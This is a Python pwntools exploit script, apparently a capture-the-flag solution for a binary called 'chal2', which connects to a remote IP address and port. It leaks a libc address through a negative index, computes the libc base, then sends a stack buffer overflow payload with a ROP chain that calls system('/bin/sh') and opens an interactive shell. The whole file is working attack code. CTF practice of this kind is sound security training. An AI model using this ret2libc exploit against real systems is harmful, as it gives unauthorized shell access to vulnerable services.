from pwn import *
from pwn import tube

gdbscript = "b main\nb *main+42\n b *main+64\nb *main+102\nb *main+158\nc"

#with gdb.debug("./chal2", gdbscript=gdbscript) as conn:
#with process("./chal2") as conn:
with remote("54.193.31.133", 13001) as conn:
    conn: tube

    print(conn.recvline())
    conn.sendline(str(-96 // 8).encode())
    line = conn.recvline(keepends=False)
    print(line)
    libc_leak_addr = int(line)
    libc_base_addr = libc_leak_addr - 0x7ffff7c80e50 + 0x7ffff7c00000
    print(f"libc_base_addr {hex(libc_base_addr)}")

    print(conn.recvline())
    conn.sendline(b"100000")
    print(conn.recvline())
    print(conn.recvline())

    system_addr = libc_base_addr - 0x7ffff7c00000 + 0x7ffff7c50d70
    set_rdi_gadget_addr = libc_base_addr + 0x2a3e5
    ret_gadget_addr = libc_base_addr + 0x29cd6
    binsh_addr = libc_base_addr - 0x7ffff7c00000 + 0x7ffff7dd8678
    payload = \
        b"h" * (0x28 + 0x8) + \
        p64(set_rdi_gadget_addr) + \
        p64(binsh_addr) + \
        p64(ret_gadget_addr) + \
        p64(system_addr)
    conn.sendline(payload)

    print(conn.recvline())
    conn.sendline(b"exit")
    print(conn.recvline())

    conn.interactive()
